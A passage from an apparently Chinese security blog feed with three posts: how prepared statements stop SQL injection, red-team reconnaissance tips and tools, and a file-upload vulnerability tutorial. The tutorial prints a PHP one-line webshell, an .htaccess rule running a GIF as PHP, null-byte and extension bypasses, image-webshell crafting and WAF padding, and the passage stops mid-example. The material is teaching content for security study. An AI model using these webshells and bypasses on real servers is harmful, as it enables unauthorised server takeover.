class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br><span class="hljs-regexp">//</span>执行<br><span class="hljs-variable">$mysqli_stmt</span>-&gt;execute();<br></code></pre></td></tr></table></figure><p>预编译语句的优势在于：一次编译、多次运行，省去了解析优化等过程。</p><p>预编译防止SQL注入的原理</p><p>正常情况下，用户输入的参数会直接参与SQL语法的编译，而预编译则是先构建语法树，确定SQL语法结构以后，再拼接用户的参数。注入的恶意SQL语句只会被视为参数，参与不了SQL语句的语法树构建，也就无法改变其语法结构，也就无法达到编译恶意语句的目的。</p><p>比如：不使用预编译，用单引号提前闭合的方式注入恶意SQL语句</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;张三&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1=1&#x27;</span>；<br></code></pre></td></tr></table></figure><p>使用了预编译：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;张三” or “1=1&#x27;</span>；<br></code></pre></td></tr></table></figure><p>这里payload是张三’ or ‘1=1，会被当做参数，单引号会被转义成’’，从数据库查的时候，查的就是name=’张三’ or ‘1=1’,而数据库不会存在名字为’张三’ or ‘1=1’的人，所有查不到。</p><h2 id="4-预编译的局限性"><a href="#4-预编译的局限性" class="headerlink" title="4 预编译的局限性"></a>4 预编译的局限性</h2><p>预编译的机制是先编译，再传值，用户传递的参数无法改变SQL语法结构，从根本上解决了SQL注入的问题。但并不是所有参数都可以使用预编译。</p><ul><li><p>比如动态表名和列名的场景：在生成语法树的过程中，预处理器在进一步检查解析后的语法树时，会检查数据表和数据列是否存在，因此数据表和数据列不能被占位符?所替代。但在很多业务场景中，表名需要作为一个变量存在，因此这部分仍需由加号进行SQL语句的拼接，若表名是由外部传入且可控的，仍会造成SQL注入。</p></li><li><p>动态传参的场景，如动态表名，列名，Order by $param，不能使用预编译，应该使用严格的白名单校验。order by后一般是接字段名，而字段名是不能带引号的，比如 order by username；如果带上引号成了order by ‘username’，那username就是一个字符串不是字段名了，这就产生了语法错误。一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号。</p></li><li><p>凡是字符串但又不能加引号的位置都不能参数化；包括sql关键字、库名表名字段名函数名等等。不能参数化的位置。不管怎么拼接，最终都是和使用“+”号拼接字符串的功效一样：拼成了sql语句但没有防sql注入的效果。</p></li></ul><h2 id="5-模糊查询预编译"><a href="#5-模糊查询预编译" class="headerlink" title="5 模糊查询预编译"></a>5 模糊查询预编译</h2><p>模糊查询本身并不支持预编译，占位符 ? 不适用于模糊查询中的通配符 %。占位符只能用于替换具体的值，而不能用于替换SQL语句中的其他结构，如通配符或标识符，因为预编译需要明确的参数值来进行参数绑定，所以无法进行预编译。例如：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> <span class="hljs-keyword">LIKE</span> ‘%abc%’<br></code></pre></td></tr></table></figure><p>这个查询会返回名字中包含“abc”的所有用户。但是，由于通配符的存在，参数值是不确定的，因此无法进行预编译。当执行如下语句时，会报错：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> <span class="hljs-keyword">LIKE</span> ‘%?%’<br></code></pre></td></tr></table></figure><p>报错：Parameter index out of range (1 &gt; number of parameters, which is 0).</p><p>%?%是字符串，所以不会被当做一个参数解析。</p><p>解决方案是修改语句如下：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> id,<span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> people <span class="hljs-keyword">where</span> address <span class="hljs-keyword">LIKE</span><br><br>concat(<span class="hljs-string">&#x27;%&#x27;</span>,?,<span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span>；<br><br><span class="hljs-keyword">select</span> id,<span class="hljs-type">name</span>,age <span class="hljs-keyword">from</span> people <span class="hljs-keyword">where</span> address <span class="hljs-keyword">LIKE</span><br><br>concat(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;key,jdbcType=<span class="hljs-type">VARCHAR</span>&#125;,<span class="hljs-string">&#x27;%&#x27;</span>) <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span>；<br></code></pre></td></tr></table></figure><p>Mybatis场景下$和#的区别</p><p>${}:表示拼接sql串，将接收到参数的内容不加任何修饰拼接在sql中，可能引发sql注入。</p><p>#{ }是预编译处理，MyBatis在处理#{ }时，它会将sql中的#{ }替换为？，然后调用PreparedStatement的set方法来赋值，传入字符串后，会在值两边加上单引号，使用占位符的方式提高效率，可以防止sql注入。因此最好使用#{ }方式。</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h2><p>预编译是利用占位符替代参数值，预先建立语法树的过程。注入的恶意SQL语句只会被视为参数，参与不了SQL语句的语法树构建，也就无法改变其语法结构，也就无法达到编译恶意语句的目的。然而，预编译有一些局限性，比如，模糊查询由于存在% _使得参数值是不确定的，需要修改预编译语句。</p><p>我的上一篇博客出现了两个错误，我这里做出勘误。</p><p>我在查找相关资料的时候，在知乎上遇到了错误的回答（而且还是一个大佬的回答），大致是强调Java预编译会做强制类型转换来防止SQL注入。注意预编译防止SQL注入并不是从强制类型转换这一角度出发的，setstring()这类操作只是Java预编译对用户输入增加的过滤操作而已。务必记住关键词，那就是语法树的建立。模糊查询也是可以通过修改语句来适配预编译的。再次强调，希望大家在学习的时候务必多搜索多求证，避免出现知识误区。</p><h2 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7 参考链接"></a>7 参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.zhihu.com/question/52869762/answer/132471224">https://www.zhihu.com/question/52869762/answer/132471224</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://zhuanlan.zhihu.com/p/578134933">https://zhuanlan.zhihu.com/p/578134933</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://blog.csdn.net/wangyuxiang946/article/details/132356363">https://blog.csdn.net/wangyuxiang946/article/details/132356363</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://blog.csdn.net/HZX19941018/article/details/100047456">https://blog.csdn.net/HZX19941018/article/details/100047456</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://segmentfault.com/a/1190000040023061">https://segmentfault.com/a/1190000040023061</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://zhuanlan.zhihu.com/p/210732421">https://zhuanlan.zhihu.com/p/210732421</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://blog.csdn.net/qq_34868715/article/details/100734095">https://blog.csdn.net/qq_34868715/article/details/100734095</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://blog.csdn.net/jie11447416/article/details/51318389">https://blog.csdn.net/jie11447416/article/details/51318389</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【干货】红队打点技巧总结</title>
    <link href="/2023/08/16/redteam-fast/"/>
    <url>/2023/08/16/redteam-fast/</url>
    
    <content type="html"><![CDATA[<p>本篇主要分享一些自己的红队思路和使用的工具，希望对你有一些帮助。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>0x01 红队知识扫盲<br>0x02 打点技巧总结<br>0x03 涉及工具<br>0x04 参考链接</p><h2 id="0x01-红队知识扫盲"><a href="#0x01-红队知识扫盲" class="headerlink" title="0x01 红队知识扫盲"></a>0x01 红队知识扫盲</h2><p>渗透测试作为一种安全防护手段，让安全防护从被动转换成主动，正被越来越多企业及机构认可，但也仅限于是防护基础工作之一，代表企业网络系统正合法合规的运行着。然而企业的业务场景是动态变化的，黑客的攻击手法、0day漏洞更是层出不穷，红蓝队对抗便是针对此方面的测试。<br>红蓝队对抗是以红队模拟真实攻击，蓝队负责防御。红队（RedTeam）区别于传统的渗透测试，更偏向于实战。</p><h2 id="0x02-打点技巧总结"><a href="#0x02-打点技巧总结" class="headerlink" title="0x02 打点技巧总结"></a>0x02 打点技巧总结</h2><p>1.拿到靶标，资产收集</p><ul><li>批量域名转IP ，从旁站入手（挂靠在同个服务器的不同站点），找各类资产，如小程序，APP，公众号，类似的子站等加入资产中；</li><li>根据IP找C段：我一般用Goby普通扫描去找C段；</li><li>先看靶标再看子域名；</li><li>子域名爆破：用Oneforall 子域名爆破有时候往往能找到脆弱站点，比如开发人员忘记关闭测试站点，可以通过弱口令拿到web应用普通权限然后尝试提权或者注入shell实现RCE；比如常见web应用，OA系统，监控系统，Jira，gitlab等等都可能存在系统历史漏洞。</li><li>同样拿到子域名的IP也可以看C段；</li><li>若有第三方供应商，可以查备案，找到属于该厂商的所有主域名，加入资产列表中。</li></ul><p>2.识别存活站点</p><pre><code class="hljs">Httpx，快照工具等（先埋坑，后面补上） </code></pre><p>3.Ehole 指纹识别 配合Afrog作poc扫描</p><ul><li>寻找重要站点，比如能识别“后台”“OA”系统等指纹，丰富的指纹库是重点。</li><li>配合Afrog进行Poc扫描：Poc就是常见漏洞的验证脚本，一般是python写的，平时积累Poc可以用于漏洞的快速识别。</li></ul><p>4.Nmap全端口扫描/ Goby 扫端口</p><pre><code class="hljs">全端口扫描能找到站点开放的服务，端口存在web开放的页面可以进一步利用。</code></pre><p>5.插件简单打点</p><ul><li>js文件审计：浏览器按F11去审js文件，有时候会看到一些注释或者代码泄露信息，找到其他站点；</li><li>利用插件搜集信息：Wappalyzer插件指纹识别；Findsomething插件（敏感信息比如js文件，敏感路径，ip地址，邮箱都能识别出来）；</li><li>其他：burp有些插件可以识别shiro，log4j漏洞；</li></ul><p>6.Dirsearch/Ffuf 跑目录 </p><pre><code class="hljs">目录字典是关键，注意积累自己的常用字典。几次攻防演练我都没有通过此途径挖到漏洞，但是其他队员都有挖到过未授权的路径。</code></pre><p>7.找文件上传点</p><ul><li>找敏感路径，找脆弱站点的文件上传处，比如微信公众号存在未关闭的文件上传处。</li><li>总结下来，几次攻防演练我都停留在找脆弱站点的层面，并没能通过旁站拿到主站权限，往后学习要提升getshell和内网渗透方面的能力。</li></ul><h2 id="0x03-涉及工具"><a href="#0x03-涉及工具" class="headerlink" title="0x03 涉及工具"></a>0x03 涉及工具</h2><ul><li><p>网络空间搜索引擎Fofa，fofaviewer（查看资产更简介快捷）<br><a href="https://search.censys.io/">https://search.censys.io</a>      //端口收集扫描比较全<br><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com</a>    //可视化图形资产，可与fofa结合使用<br><a href="https://duckduckgo.com/">https://duckduckgo.com</a>        //找后台比较无助的时候可以尝试site:xxx.com login<br><a href="https://ww.shodan.io/">https://ww.shodan.io</a>          //shodan；</p></li><li><p>子域名爆破 Oneforall等</p></li><li><p>Nmap（端口扫描）；比如我就通过全端口扫描，找到过一个弱口令登录站点，拿到web应用管理员权限。</p></li><li><p>漏扫Goby（一般用来全端口扫描和看C段）,Railgun,Nuclei等；</p></li><li><p>Ehole，Wappalyzer插件指纹识别；</p></li><li><p>Findsomething插件（敏感信息比如js文件，敏感路径，ip地址，邮箱都能识别出来）；</p></li><li><p>Dirsearch/Ffuf 作目录扫描，有时候可以用Burpsuite的intruder做简单的目录扫描；</p></li><li><p>Afrog作为poc扫描器；有时候能捡漏，比如我就扫出过一个ERP的指纹然后弱密码登录成功；</p></li></ul><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.ddosi.org/b368/">https://www.ddosi.org/b368/</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="/2023/06/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/06/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>1 文件上传漏洞<br>2 文件上传漏洞分类<br>3 文件上传漏洞防御<br>4 总结<br>5 参考链接</p><h2 id="1-文件上传漏洞"><a href="#1-文件上传漏洞" class="headerlink" title="1 文件上传漏洞"></a>1 文件上传漏洞</h2><h3 id="1-1-什么是文件上传漏洞？"><a href="#1-1-什么是文件上传漏洞？" class="headerlink" title="1.1 什么是文件上传漏洞？"></a>1.1 什么是文件上传漏洞？</h3><p>WEB应用在文件上传过程中没有对文件的安全性进行有效校验，导致攻击者上传恶意文件构造攻击。校验包括通过文件特征，如文件头字节，文件后缀名等判断是否是允许上传的文件。<br>攻击者可以通过上传 webshell、病毒、恶意脚本等恶意文件对服务器进行攻击。在已知文件路径的情况下，通过文件包含或者访问等形式使该恶意代码被后端执行，达到控制服务器的目的。上传漏洞经常出现于头像上传、相册上传、附件上传、新闻投稿等位置，产生的危害极大，可直接导致web服务器权限被攻击者控制。<br>webshell又称网页木马文件，以asp\php\jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。根据开发语言的不同又分为ASP木马、PHP木马、JSP木马等，该类木马利用了脚本语言中的系统命令执行、文件读 写等函数的功能，一旦上传到服务器被脚本引擎解析，攻击者就可以实现对服务器的控制。</p><p>图片</p><p>常见的一句话木马有：</p><pre><code class="hljs">&lt;?php @eval($_POST[&#39;para&#39;]);?&gt;</code></pre><p>para即为webshell连接的密码</p><h3 id="1-2-常见的测试方法："><a href="#1-2-常见的测试方法：" class="headerlink" title="1.2 常见的测试方法："></a>1.2 常见的测试方法：</h3><ol><li>黑盒测试：通过工具扫描网站敏感文件、路径，以期获得文件上传地址。或者对存在上传图片的功能处进行漏洞测试。</li><li>白盒测试：审计代码，查找upload_file等功能，审计是否存在上传漏洞。通过抓包、上传等操作判断漏洞是否存在。 <h2 id="2-文件上传漏洞分类"><a href="#2-文件上传漏洞分类" class="headerlink" title="2 文件上传漏洞分类"></a>2 文件上传漏洞分类</h2>文件上传漏洞分类<br>可以简单分为前端和后端的绕过。</li></ol><p>图片</p><h3 id="2-1-前端绕过"><a href="#2-1-前端绕过" class="headerlink" title="2.1 前端绕过"></a>2.1 前端绕过</h3><p>前端一般利用JavaScript对文件大小、后缀名等进行检验。其中后缀名使用黑名单或白名单拦截。然而恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件，就会导致基于js的校验很容易被绕过。</p><p>前端检测绕过方法有如下几种：</p><p>1.禁用js：通过火狐插件 NOscript 插件或者禁用IE中JS脚本；</p><p>2.删除代码：通过元素审查修改代码（如删除 onsubmit=”return checkFile()” 事件）；</p><p>3.修改js代码：通过元素审查 javascirpt 脚本中添加上传文件类型；</p><p>4.burp改包：通过利用 burp 抓包改包，先上传一个 png 类型的木马，然后通过 burp 将其改为asp/php/jsp 后缀名即可。注意：这里修改文件名字后，请求头中的 Content-Length 的值也要改（burp默认会自动修改）。</p><h3 id="2-2-后端绕过"><a href="#2-2-后端绕过" class="headerlink" title="2.2 后端绕过"></a>2.2 后端绕过</h3><p>主要包括检查后缀名绕过、检查内容和其他绕过。</p><p>后缀名绕过包括黑名单和白名单绕过：</p><h4 id="2-2-1黑名单绕过"><a href="#2-2-1黑名单绕过" class="headerlink" title="2.2.1黑名单绕过"></a>2.2.1黑名单绕过</h4><p>黑名单是通过设置禁止上传的文件名后缀，对可接受的文件格式进行限制，避免攻击者上传恶意代码文件。而过滤的方式存在一定的缺陷，比如存在过滤的黑名单不全，未考虑大小写，以及要上传文件的名称存在敏感字符。</p><pre><code class="hljs">特殊解析后缀.htaccess绕过大小写绕过点绕过/空格绕过::$DATA绕过双后缀名绕过</code></pre><p>1 解析漏洞：特殊解析后缀</p><pre><code class="hljs">Apache解析漏洞IIS6.0解析漏洞IIS7.0 | IIS7.5 | Nginx的解析漏洞</code></pre><p>（1）Apache解析漏洞：<br>Apache 解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别文件解析，就再往左判断。比如test.php.a.b的“.a”和“.b”这两种后缀是apache不可识别解析，apache就会把test.php.a.b解析成test.php。</p><p>影响版本：apache 1.x apache 2.2.x<br>（2）IIS6.0解析漏洞：<br>IIS6.0解析漏洞分两种：</p><p>1、目录解析： 以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。</p><p>2、文件解析：xx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。</p><p>IIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。</p><p>（3）IIS7.0 | IIS7.5 | Nginx的解析漏洞：<br>Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。 这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。</p><p>举个例子，当php遇到文件路径/1.jpg/2.txt/3.php时，若/1.jpg/2.txt/3.php不存在，则会去掉最后的/3.php，然后判断/1.jpg/2.txt是否存在，若存在，则把/1.jpg/2.txt当做文件/1.jpg/2.txt/3.php，若/1.jpg/2.txt仍不存在，则继续去掉/2.txt，以此类推。<br>漏洞形式：<br><a href="http://www.xxxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxxx.com/UploadFiles/image/1.jpg/1.php</a></p><p>另外两种解析漏洞：<br><a href="http://www.xxxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxxx.com/UploadFiles/image/1.jpg%00.php</a> </p><p><a href="http://www.xxxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p><p>2 .htaccess绕过</p><p>漏洞利用前提:：<br>  web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。</p><p>原理：<br>.htaccess文件(或者”分布式配置文件”) ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>利用方式:上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。<br>.htaccess文件内容: .htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。<br>    &lt;FilesMatch “evil.gif”&gt;<br>    SetHandler application/x-httpd-php<br>#在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行</p><p>#在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行</FilesMatch><br>3 大小写绕过</p><p>1.代码只对后缀名为.php的文件进行了拦截,并未对.pHp后缀名的文件拦截</p><p>2.上传后缀名为.pHp的文件</p><p>4 点绕过/空格绕过</p><p>利用Windows的命名机制<br>shell.php. shell.php空格 在windows中，后缀名后面的点和空格都会被删除掉。</p><p>例如:</p><pre><code class="hljs">a.php\[空格](点)[空格]a.php .a.php(点)\[空格](点)</code></pre><p>deldot删除最后一个点之后，不再进行删除，trim删除空格，那么最终上传的文件名为1.php.，利用Windows自动去除最后一个点，导致成功上传1.php；</p><p>5 ::$DATA绕过</p><p>背景原因:(windows特性)</p><p>在window系统下，如果上传的文件名为a.php::$DATA，它会在服务器上生成一个a.php的文件，其中内容和所上传内容相同，并被解析。</p><p>例如:phpinfo.php::$DATAWindows会自动去掉末尾的::$DATA变成phpinfo.php</p><p>利用示例:</p><p>通过BurpSuite截断 HTTP 请求之后，在对应的文件后缀名处添加::$DATA。</p><pre><code class="hljs">a.php::$DATA</code></pre><p>注意，在windows下，无法直接测试::$DATA，因为windows不允许后缀名中存在特殊字符；</p><p>6 双后缀名绕过</p><p>有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。比如：pphphp</p><h4 id="2-2-2-后缀名白名单绕过"><a href="#2-2-2-后缀名白名单绕过" class="headerlink" title="2.2.2 后缀名白名单绕过"></a>2.2.2 后缀名白名单绕过</h4><p>白名单检测:一般有个专门的 whitelist 文件，里面会包含的正常文件：jpg png GIF</p><p>（1）Content-Type 字段绕过</p><p>HTTP header的Content-Type 实体头部用于指示资源的 MIME 类型 media type 。</p><p>MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p>在响应中，Content-Type 标头告诉客户端实际返回的内容的内容类型。</p><p>检测：如果服务端代码是通过Content-Type的值来判断文件的类型，会检测文件的MIME类型，然后判断是否符合条件。那么就存在被绕过的可能，因为Content-Type的值是通过客户端传递的，是可以任意修改的 。</p><p>绕过；使用burp抓包，修改请求的Content-Type类型从而绕过检测，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验，上传php文件。</p><p>如Content-Type: image/jpg，Content-Type: image/png，Content-Type: text/plain。</p><p>（2）截断上传</p><pre><code class="hljs">%00截断0x00截断0x0a截断PHP%00截断</code></pre><p>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断</p><p>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</p><p>无论0x00还是%00，最终被解析后都是一个东西:chr（0）</p><p>在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。</p><p>使用burpsuite进行抓包，因为这里是通过URL进行传递的文件上传后存储路径，所以需要对16进制的00进行URL编码，编码的结果就是%00，通过这种方式，就可以%00截断后面的内容，让拼接的文件名不再进行生效。</p><p>当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃。</p><p>在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效。</p><p>使用00截断绕过后端验证，除非两个条件之一：</p><p>1.后缀检测，合格则进行上传路径拼接，文件名中还是包含截断字符的，路径拼好之后可以被截断成想要的.php。</p><p>2.文件路径可控，拼接路径和文件名，组成文件上传路径。比如我可以修改路径拼接的path时，比如抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00，先构造一个存在截断字符的后缀“等着”真正的文件名，或者后缀名，因为不管它是啥，都会被截断而丢弃，因为这里已经到了“最后阶段”，不会再有安检过程了，这里截断之后的结果就是最终上传的结果，比如下图中，抓到的包里发现了路径，那么使用上面的方法直接改它，就可以成功上传aa.php文件，不管被处理后的文件名是什么，在这里被截断才是真正的“截断”，因为这是在安检（后缀名校验）之后进行的截断，直接决定真实的文件后缀名。 </p><h4 id="2-2-3-文件内容检查绕过"><a href="#2-2-3-文件内容检查绕过" class="headerlink" title="2.2.3 文件内容检查绕过"></a>2.2.3 文件内容检查绕过</h4><p>（1）getimagesize绕过（检查文件头字节）</p><p>突破getimagesize：在文件内容的起始位置加上一个GIF89a，php的getimagesize()函数也以为我们上传的webshell文件是图片。</p><p>注意：下面的文件头的格式是16进制的格式：</p><pre><code class="hljs">GIF：47 49 46 38 39 61png：89 50 4E 47 0D 0A 1A 0A JPG：FF D8 FF E0 00 10 4A 46 49 46</code></pre><p>在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。</p><pre><code class="hljs">s1.phpGIF89a&lt;?php phpinfo(); ?&gt;</code></pre><p>php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过，后面的代码仍然能够得到执行。</p><p>利用：找一个符合上传过滤类型的文件与脚本文件合并制作图片木马，后将新文件上传，再结合文件包含漏洞getshell。</p><p>制作图片木马</p><pre><code class="hljs">C:\Users\Desktop&gt;copy a.png/b + s1.php/a img.gifa.pngs1.php</code></pre><p>文件头代码拦截示例：</p><p> 1.文件上传接口，读取文件，并将文件转为输入流；</p><p> 2.截取文件流的前四个字节，并将其转成16进制，并转为大写</p><p> 3.比较截取的字符与常见的文件类型头部字符进行比对，返回文件的类型</p><p> 4.正常通过，存在异常则报错；</p><p>（2）突破exif_imagetype</p><p>exif_imagetype()函数:读取一个图像的第一个字节并检查其签名，如果发现恰当的签名返回一个对应的常量，否则返回false。返回值和getimagesize()返回值的数组中的索引2的值是一样的，但本函数快的多。</p><p>制作图片木马绕过，结合文件包含漏洞进行利用。</p><p>（3）二次渲染漏洞：<br>1.二次渲染原理：<br>    在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p><p>2.绕过：<br>配合文件包含漏洞：将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</p><p>可以配合条件竞争：这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传</p><h3 id="2-2-4-其他绕过"><a href="#2-2-4-其他绕过" class="headerlink" title="2.2.4 其他绕过"></a>2.2.4 其他绕过</h3><p>（1）条件竞争漏洞：<br>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。</p><p>由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：</p><p>1.访问时间点在上传成功之前，没有此文件。</p><p>2.访问时间点在刚上传成功但还没有进行判断，该文件存在。</p><p>3.访问时间点在判断之后，文件被删除，没有此文件。</p><p>（2）WAF绕过</p><p>数据溢出绕过：</p><p>原理：数据范围都是有限，超过WAF的检测范围就不会往下检测</p><p>正常情况下</p><pre><code class="hljs">content-disposition:form-data; name=&quot;upload_file&quot;; filename=&quot;xxxx&quot;;content-type: image/jpeg</code></pre><p>方法一：在content-disposition:字段里写入无用数据（直达WAF检测不出来）</p><p>可以在form-data前面添加无效数据</p><pre><code class="hljs">content-disposition: qwfasajhchsavhjfxjassbchmvjvxevcssasvad hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmn hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav  hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjsqwfasajhchsav hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmnsvcyewgchvgegjcbwveyiwcvjs(直达WAF检测不出来)  form-data; name=&quot;upload_file&quot;; filename=&quot;xxxx.php&quot;;content-type: image/jpeg</code></pre><p>也可以在form-data后面添加无效数据</p><pre><code class="hljs">content-disposition: form-data qwfasajhchsavhjfxjassbchmvjvxevcssasvad hjhegvwchjsvnmcvejgabvxeyfwavcyefwkcbmn 